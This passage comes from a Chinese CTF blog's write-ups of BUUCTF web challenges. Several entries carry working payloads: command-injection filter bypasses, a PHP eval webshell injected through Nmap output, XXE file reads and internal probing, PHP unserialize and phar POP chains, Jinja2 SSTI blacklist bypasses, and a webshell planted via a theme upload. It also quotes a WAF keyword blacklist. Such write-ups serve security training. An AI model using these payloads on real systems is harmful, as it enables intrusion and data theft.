让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>level1   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="variable">$num</span>) &lt; 2020 &amp;&amp; intval(<span class="variable">$num</span> + 1) &gt; 2021</span><br></pre></td></tr></table></figure><p>这里传入num=1e7即可。<br>在进行intval($num)时被截断成为1，1&lt;2020 =&gt; True;<br>而$num+1时就解析为科学技术法，结果是10000001（也不知道位数对不对，随意啦）。<br>绕过了。   </p><p>level2    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">'md5'</span>];</span><br></pre></td></tr></table></figure><p>一般绕过md5的方法有两种，一个是以0e开头，后面全是数字的结果，这个会被解析为科学计数法为0；另一个是利用数组绕过。<br>这里利用0e绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">'0e215962017'</span>) ==&gt; “0e291242476940776845150308577824”</span><br></pre></td></tr></table></figure><p>get flag<br>这里是个RCE，过滤了空格和cat。<br>空格用%09(tab)绕过，cat用反斜杠绕过，构造成ca\t:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fl4g.php?num=1e7&amp;md5=0e215962017&amp;get_flag=ca\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>回显hacker，经查，php被过滤，使用短标签绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' &lt;?= @eval($_POST["hack"]);?&gt; -oG hack.phtml '</span></span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><h1 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h1><p>前端验证，直接访问/flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">(code)</span></span>&#123;</span><br><span class="line">  hash = hex_md5(code);</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> code = document.getElementById(<span class="string">"vcode"</span>).value;</span><br><span class="line">  <span class="keyword">if</span> (code != <span class="string">""</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(hex_md5(code) == <span class="string">"0cd4da0223c0b280829dc3ea458d655c"</span>)&#123;</span><br><span class="line">      alert(<span class="string">"您通过了验证！"</span>);</span><br><span class="line">      window.location = <span class="string">"./flag.php"</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      alert(<span class="string">"你的授权码不正确！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    alert(<span class="string">"请输入授权码"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改请求数据包头部X-Forwarded-For:127.0.0.1</p><h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>读取源码，发现file协议读没用，换php协议读</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY penson SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php"</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>没发现什么<br>打内网,先读取/etc/hosts，我这里是没发现ip，看网上的writeup是存在个ip地址，爆破一下c端地址，其中访问一个ip地址即可得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY penson SYSTEM <span class="string">"http://173.10.47.11"</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>/time.php?source=<br>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.php?data=O:8:<span class="string">"HelloPhp"</span>:2:&#123;s:1:<span class="string">"a"</span>;s:15:<span class="string">"eval(<span class="variable">$_GET</span>[y]);"</span>;s:1:<span class="string">"b"</span>;s:6:<span class="string">"assert"</span>;&#125;&amp;y=phpinfo();</span><br></pre></td></tr></table></figure><h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">$content = uniqid().$random;</span><br><span class="line"><span class="keyword">return</span> sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ssi注入漏洞：<a href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener">https://blog.csdn.net/qq_40657585/article/details/84260844</a><br><img src="../../images/ctf/buuctf/21.jpg" alt=""></p><h1 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h1><p>/.git/源码泄露<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'yds_is_so_beautiful'</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure><p>反序列化之PHP原生类的利用:<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a><br><img src="../../images/ctf/buuctf/22.jpg" alt=""></p><h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p>jwt 弱秘钥 ，pickle反序列化漏洞  </p><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>这里算是学到一个知识点，嵌套定义一个类，就可以调用<code>__construct()</code>.    </p><p>思路如下：     </p><p>1.调用include()函数，让Test类中的属性p等于Modifier这个类，从而触发<code>__get()</code>魔术方法。将Modifier这个类变成一个函数，从而调用<code>__invoke()</code>方法，进而调用include()函数</p><p>2.让source 等于对象，进而触发<code>__toString</code>方法，输出内容</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span>  $var=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>存在任意文件下载</p><p>思路如下:</p><p>上传一个phar文件，后缀为图片的格式<br>然后在delete.php中访问它，以phar://test.jpg的形式，此时会调用file-&gt;open()中的file_exists()会触发反序列化，（此时file_exists()返回的是false）<br>此时只有user的<code>__descruct</code>会调用close()函数，但是没有回显功能，我们只能找一个有回显的地方进行序列化<br>我们观察到FileList类的<code>__descruct</code>有echo函数，输出$table，而$table的内容来自$result，我们再来看一下<code>__call</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>__call</code>函数是指当调用类不存在的方法时就会调用<code>__call</code>函数<br>其中$func就是指我们调用的不存在方法，而$args是指我们的参数，<br>通过代码我们知道假如我们调用close()方法，那么最后会调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file-&gt;$func()</span><br></pre></td></tr></table></figure><p>即$file-&gt;close()，并且存入$result中，那么file_get_contents的内容就能回显出来了~~</p><p>最后的payload为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db =(<span class="keyword">new</span> FileList());</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后再说一下，为什么我们要通过delete.php触发phar反序列化，而不是通过download.php，两者都会调用file_exists()，那是因为download.php有base_dir限制，我们不能读出在/目录下的文件</p><h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>ssti模板注入<br>读取app.py文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'app.py'</span>,<span class="string">'r'</span>).<span class="built_in">read</span>() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>得知waf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(str)</span>:</span> </span><br><span class="line">  black_list = [ &amp;</span><br><span class="line">    <span class="comment">#34;flag&amp;# 34;, &amp; #34;os&amp;# 34;, &amp; #34;system&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;popen&amp;# 34;, &amp; #34;import&amp;# 34;, &amp; #34;eval&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;chr&amp;# 34;, &amp; #34;request&amp;# 34;, &amp; #34;subprocess&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;commands&amp;# 34;, &amp; #34;socket&amp;# 34;, &amp; #34;hex&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;base64&amp;# 34;, &amp; #34;*&amp;# 34;, &amp; #34;?&amp;# 34;</span></span><br><span class="line">]</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> black_list: </span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">in</span> str.lower(): </span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>@ app.route( &amp;<span class="comment">#39;/hint&amp;# 39;, methods = [ &amp; #39;GET&amp;# 39;])</span></span><br></pre></td></tr></table></figure><p>字符串拼接绕过，listdir列出文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__imp'</span>+<span class="string">'ort__'</span>](<span class="string">'o'</span>+<span class="string">'s'</span>).listdir(<span class="string">'/'</span>)&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>倒序绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read()&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>拼接绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'/this_is_the_fl'</span>+<span class="string">'ag.txt'</span>,<span class="string">'r'</span>).read()&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h1 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h1><p>后台admin.php<br>账户密码：admin shopxo</p><p>接下来就在应用中心里的应用商店找到主题，然后下载默认主题。<br>在_static_里面加上一个test.php，这里面就是我们加入的一句话了，加个phpinfo（）可以方便确认马到底有没有穿上去。在/public/static/index/default/test.php ，打开验证一下。<br>连接成功后发现目录里有flag和flag.hint<br>打开flag里面是假flag 